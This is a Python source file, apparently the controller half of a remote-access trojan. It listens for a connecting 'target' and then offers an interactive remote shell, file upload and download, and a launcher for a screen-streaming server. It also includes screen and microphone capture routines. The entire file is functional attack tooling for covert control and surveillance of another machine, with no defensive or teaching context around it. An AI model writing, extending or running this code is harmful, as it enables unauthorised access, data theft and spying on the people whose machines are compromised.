import socket
import json
import os
import threading
import cv2
import pyautogui
import mss
import numpy as np
import struct
import pyaudio
import subprocess
import sys

from dotenv import load_dotenv

# Load environment variables from .env file
dotenv_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../.env'))
print(dotenv_path)
load_dotenv(dotenv_path)

# Set variables based on .env values
TARGET_IP = os.getenv("TARGET_IP", "127.0.0.1")
TARGET_PORT = int(os.getenv("TARGET_PORT", 5000))
VIDEO_PORT = int(os.getenv("VIDEO_PORT", 9000))
AUDIO_PORT = int(os.getenv("AUDIO_PORT", 6000))

# Use these variables in your code
print(f"Target IP: {TARGET_IP}")
print(f"Target Port: {TARGET_PORT}")
print(f"Video Port: {VIDEO_PORT}")
print(f"Audio Port: {AUDIO_PORT}")

# Function to send data reliably as JSON-encoded strings
def reliable_send(socket, data):
    jsondata = json.dumps(data)
    socket.send(jsondata.encode())

# Function to receive data reliably as JSON-decoded strings
def reliable_recv(socket):
    data = ''
    while True:
        try:
            data = data + socket.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

# Function to upload a file to the target machine
def upload_file(socket, file_name):
    try:
        f = open(file_name, 'rb')
        socket.send(f.read())
    except FileNotFoundError as e:
        print(e)

# Function to download a file from the target machine
def download_file(socket, file_name):
    # Set a timeout for receiving data from the socket (1 second).
    socket.settimeout(1)
    
    try:
        first_chunk = socket.recv(1024)
        # Check for error message
        if first_chunk.startswith(b"ERROR:"):
            print(first_chunk.decode())
            return
        
        # Open the specified file in binary write ('wb') mode only if the first chunk is valid
        with open(file_name, 'wb') as f:
            f.write(first_chunk)
            
            while True:
                try:
                    chunk = socket.recv(1024)
                    if not chunk:
                        break
                    f.write(chunk)
                except TimeoutError:
                    break
    except Exception as e:
        print(f"Error occurred while downloading {file_name}: {str(e)}")
    finally:
        # Reset the timeout to its default value (None).
        socket.settimeout(None)

# Function for the main communication loop with the target
def target_communication(target):
    dir = ''
    while True:
        command = input(f'* Shell~{str(TARGET_IP)}: {dir}$ ')
        reliable_send(target, command)

        # Common command
        if command == 'quit':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            recv_data = reliable_recv(target)
            err = recv_data['stderr']
            if err:
                print(err)
            else:
                dir = recv_data['stdout'] + ' '
        elif command[:8] == 'download':
            download_file(target, command[9:])
        elif command[:6] == 'upload':
            upload_file(target, command[7:])

        # Screen Streaming
        elif command == 'screen':
            handle_screen_command()
            
        # Others
        else:
            result = reliable_recv(target)
            print(result)

# Function to get the virtual environment path
def get_virtualenv_path():
    # Check if we are in a virtual environment
    if hasattr(sys, 'real_prefix') or (hasattr(sys, 'base_prefix') and sys.base_prefix != sys.prefix):
        # Python is running in a virtual environment
        if sys.platform == 'win32':
            return os.path.join(sys.prefix, 'Scripts', 'activate.bat')
        else:
            return os.path.join(sys.prefix, 'bin', 'activate')

    # If not in a virtual environment, return None
    return None

# Function to handle screen command
def handle_screen_command():
    current_dir = os.path.abspath('.')
    script_path = os.path.join(current_dir, 'screenstream_server.py')

    virtualenv_activate = get_virtualenv_path()
    if virtualenv_activate:
        if os.name == 'posix':
            if 'darwin' in os.uname().sysname.lower():  # macOS
                # Create a new iTerm window and execute the command
                osascript_command = f'tell application "iTerm"\n' \
                                    f'  create window with default profile\n' \
                                    f'  tell current session of current window to write text "cd {os.path.dirname(script_path)} && source {virtualenv_activate} && python3 {os.path.basename(script_path)}"\n' \
                                    f'end tell'
                subprocess.Popen(["osascript", "-e", osascript_command], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                # osascript_command = f'tell app "Terminal" to do script "cd {os.path.dirname(script_path)} && source {virtualenv_activate} && python3 {os.path.basename(script_path)}"'
                # subprocess.Popen(["osascript", "-e", osascript_command])
            else:  # Linux
                terminal_command = f'gnome-terminal -- bash -c "cd {current_dir} && source {virtualenv_activate} && python3 {script_path}; exec bash"'
                subprocess.Popen(terminal_command, shell=True)
        # Add elif block for other OS types if needed
    else:
        print("Virtual environment not found.")
    
def screen_stream(screen_socket):
    w, h = pyautogui.size()
    monitor = {"top": 0, "left": 0, "width": w, "height": h}

    try:
        with mss.mss() as sct:
            while True:
                screen = sct.grab(monitor)
                frame = np.array(screen)
                _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 80])
                message = struct.pack(">L", len(buffer)) + buffer.tobytes()
                try:
                    screen_socket.sendall(message)
                except BrokenPipeError:
                    print("Broken pipe error, connection lost.")
                    break
    except KeyboardInterrupt:
        print("Stopped by user.")
    finally:
        screen_socket.close()

def audio_stream(audio_socket):
    p = pyaudio.PyAudio()
    stream = p.open(format=pyaudio.paInt16,
                    channels=1,
                    rate=44100,
                    input=True,
                    frames_per_buffer=1024)
    try:
        while True:
            data = stream.read(1024, exception_on_overflow=False)
            audio_socket.sendall(data)
    except KeyboardInterrupt:
        print("Stopped by user.")
    finally:
        stream.stop_stream()
        stream.close()
        p.terminate()
        audio_socket.close()

def main():
    # Create a socket for the server
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((TARGET_IP, TARGET_PORT))
    sock.listen(5)
    print('[+] Listening For The Incoming Connections')

    # Accept incoming connection from the target
    target, ip = sock.accept()
    print('[+] Target Connected From: ' + str(ip))

    # Start the main communication loop with the target
    target_comm_thread = threading.Thread(target=target_communication, args=(target,))
    target_comm_thread.start()
    target_comm_thread.join()

    # Close the server socket
    sock.close()

if __name__ == "__main__":
    main()
